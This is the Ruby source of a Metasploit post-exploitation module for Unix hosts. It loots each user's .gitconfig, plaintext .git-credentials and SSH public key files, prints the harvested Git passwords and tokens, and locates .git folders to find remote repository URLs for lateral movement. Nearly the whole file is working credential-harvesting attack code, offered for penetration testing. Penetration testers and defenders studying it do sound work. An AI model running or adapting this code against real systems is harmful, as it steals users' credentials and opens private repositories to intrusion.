##

# This module requires Metasploit: https://metasploit.com/download

# Current source: https://github.com/rapid7/metasploit-framework

##



require 'uri'



class MetasploitModule < Msf::Post

  include Msf::Post::File

  include Msf::Post::Unix



  def initialize(info={})

    super( update_info(info,

      'Name'           => 'Enumerate git credentials/tokens from user profiles, and find lateral movement options',

      'Description'    => %q{

          This module will look for ".ssh" authentication for GitHub as well as password/token based over HTTPS. 

          Password auth is stored plaintext in ~/.git-credentials. It will also check all ".git/config" files
	  for the remote URL so you can zero in on internal Git servers and possible private repositories online.

          This module is largely based on firefox_creds.rb.

      },

      'License'        => MSF_LICENSE,

      'Author'         => ['Paul Ritchie @cornerpirate'],

      'Platform'       => %w{ bsd linux osx unix },

      'SessionTypes'   => ['meterpreter', 'shell' ]

    ))

  end



  def run

	# Get .gitconfig files

	print_status("Finding user .gitconfig file and looting them")

	paths = enum_user_directories.map {|d| d + "/.gitconfig"}

	# Array#select! is only in 1.9

	# Returns any path where ".gitconfig" exiss.

	paths = paths.select { |d| file?(d) }



	if paths.nil? or paths.empty?

		print_error("No users found with a .gitconfig file")

	else

		get_data_gitconfig(paths)

	end

    

	# Get .git-credentials files 

	print_status("Finding user .git-credentials file and looting them")

	paths2 = enum_user_directories.map {|d| d + "/.git-credentials"}

	# Array#select! is only in 1.9

	# Returns any path where the ".git-credentials" exists

	paths2 = paths2.select { |d| file?(d) }



	if paths2.nil? or paths2.empty?

		print_error("No users found with a .git-credentials file")

	else

		get_data_gitcreds(paths2)

	end

    

	# Get .ssh/id_rsa.pub files

	print_status("Finding user .ssh/id_rsa.pub file and looting them")

	paths3 = enum_user_directories.map {|d| d + "/.ssh/id_rsa.pub"}

	# Array#select! is only in 1.9

	# Returns any path where the ".ssh/id_rsa.pub" exists

	paths3 = paths3.select { |d| file?(d) }



	if paths3.nil? or paths3.empty?

		print_error("No users found with a .ssh/id_rsa.pub file")

	else

		get_data_sshkeys(paths3)

	end

     

	#find .git folders

	print_status("Finding all .git folders")



	# Using "locate" for the moment

	# Using "find" never returns results. I did try caching to a /tmp/ file

	# then cating that back. Cannot find a "metasploit" way of executing find.

	dirs = cmd_exec("locate -r '/\\.git$'")

	# print_status(dirs.strip)

	# Check if we got results

	if dirs.lines.count <1

		print_status("Sorry, no .git folders located")

	else

		# Bonus we have some repositories to play with

		get_data_gitfolders(dirs)

	end



  end



  def get_data_gitfolders(dirs)

	print_status("Found " + dirs.lines.count.to_s + " .git folders to explore")

	dirs.each_line do |dir|

		dir = dir.strip

      		print_status("Checking: " + dir)

		file = dir  + "/config"

		data = read_file("#{file}")

		# the .git/config file states remote URLs

		url = cmd_exec("grep url " + file)
		url = url[url.index("= ")+2,url.size]



		# Let's check what type of repository we have found

      		if url.starts_with?("git@")

			print_status("\tRepo cloned over SSH: " + url)

		elsif url.starts_with?("http")

			u = URI.parse(url)

			if u.host == "github.com"

				print_status("\tRepo cloned over HTTP (from github): " + url)

			else

				print_bad("\tRepo cloned over HTTP (NOT github): " + url )

			end # end if

		end # end if



	 end # end for loop

  end

  

  # Loot the SSH key files and say where to.

  def get_data_sshkeys(paths)

    paths.each do |file|

      file.chomp!

      data = read_file("#{file}")

      loot_path = store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")

      print_good("Downloaded -> #{loot_path}")

    end

  end

  
  # Loot the ".git-credentials" files

  def get_data_gitcreds(paths)

    paths.each do |file|

      file.chomp!

      data = read_file("#{file}")

      print_good(data.strip)

 	   loot_path = store_loot("git-credentials.#{file}", "text/plain", session, data, "git-credentials_#{file}", "Git #{file} File")

      print_good("Downloaded -> #{loot_path}")

    end

  end

  
  # Loot the ".gitconfig" files for basic user setup

  def get_data_gitconfig(paths)

    paths.each do |file|

      file.chomp!

      data = read_file("#{file}")

      loot_path = store_loot("gitconfig.#{file}", "text/plain", session, data, "git-config#{file}", "Git #{file} File")

      print_good("Downloaded -> #{loot_path}")

    end      

  end

end
